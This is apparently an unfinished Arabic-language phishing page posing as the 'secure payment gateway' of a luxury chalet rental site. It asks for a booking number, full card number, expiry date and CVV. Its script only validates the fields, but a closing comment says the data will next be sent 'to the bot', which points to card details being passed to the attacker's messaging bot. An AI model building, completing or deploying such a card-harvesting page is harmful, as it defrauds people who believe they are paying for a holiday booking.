<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة الدفع الآمنة</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      direction: rtl;
      background-color: #f4f4f4;
      margin: 0;
    }
    header, footer {
      background-color: #003366;
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    .logo {
      max-width: 100%;
      height: 120px;
    }
    main {
      padding: 20px;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .error-message {
      color: red;
      font-size: 14px;
      display: none;
      margin-top: 10px;
    }
    button {
      margin-top: 20px;
      background-color: #003366;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      border-radius: 6px;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <header>
    <img class="logo" src="https://images.unsplash.com/photo-1582719478171-fffd3ba7cd5d" alt="صورة الشاليه"/>
  </header>

  <main>
    <form id="paymentForm">
      <label for="bookingNumber">رقم الحجز (6 أرقام):</label>
      <input type="text" id="bookingNumber" pattern="\\d{6}" required />

      <label for="confirmBooking">تأكيد رقم الحجز:</label>
      <input type="text" id="confirmBooking" pattern="\\d{6}" required />

      <label for="cardNumber">رقم البطاقة:</label>
      <input type="text" id="cardNumber" maxlength="16" pattern="\\d{16}" required />

      <label>تاريخ انتهاء البطاقة 📅</label>
      <label for="expiryMonth">الشهر:</label>
      <select id="expiryMonth" required>
        <option value="">--</option>
        <option>01</option><option>02</option><option>03</option>
        <option>04</option><option>05</option><option>06</option>
        <option>07</option><option>08</option><option>09</option>
        <option>10</option><option>11</option><option>12</option>
      </select>

      <label for="expiryYear">السنة:</label>
      <select id="expiryYear" required>
        <option value="">--</option>
        <option>2025</option><option>2026</option><option>2027</option>
        <option>2028</option><option>2029</option><option>2030</option>
        <option>2031</option><option>2032</option><option>2033</option>
        <option>2034</option><option>2035</option><option>2036</option>
        <option>2037</option><option>2038</option><option>2039</option>
        <option>2040</option>
      </select>

      <label for="cvv">CVV:</label>
      <input type="text" id="cvv" maxlength="4" pattern="\\d{3,4}" required />

      <p id="dateError" class="error-message">❗ لأسباب أمنية لا يمكننا قبول بطاقات منتهية الصلاحية. نحتفظ بحق رفض المعاملة لحمايتك من الاحتيال.</p>
      <p id="matchError" class="error-message">❗ رقم الحجز وتأكيده غير متطابقين.</p>

      <button type="submit">ادفع الآن</button>
    </form>
  </main>

  <footer>
    جميع الحقوق محفوظة © 2025 | موقع روز الرسمي لتأجير الشاليهات الفاخرة
  </footer>

  <script>
    document.getElementById("paymentForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const booking = document.getElementById("bookingNumber").value;
      const confirm = document.getElementById("confirmBooking").value;
      const month = parseInt(document.getElementById("expiryMonth").value);
      const year = parseInt(document.getElementById("expiryYear").value);

      const matchError = document.getElementById("matchError");
      const dateError = document.getElementById("dateError");

      matchError.style.display = "none";
      dateError.style.display = "none";

      if (booking !== confirm) {
        matchError.style.display = "block";
        return;
      }

      if (year < 2025 || (year === 2025 && month < 7)) {
        dateError.style.display = "block";
        return;
      }

      alert("تم إرسال البيانات بنجاح!");
      // هنا ترسل البيانات إلى البوت في الخطوة التالية إن شاء الله
    });
  </script>

</body>
</html>
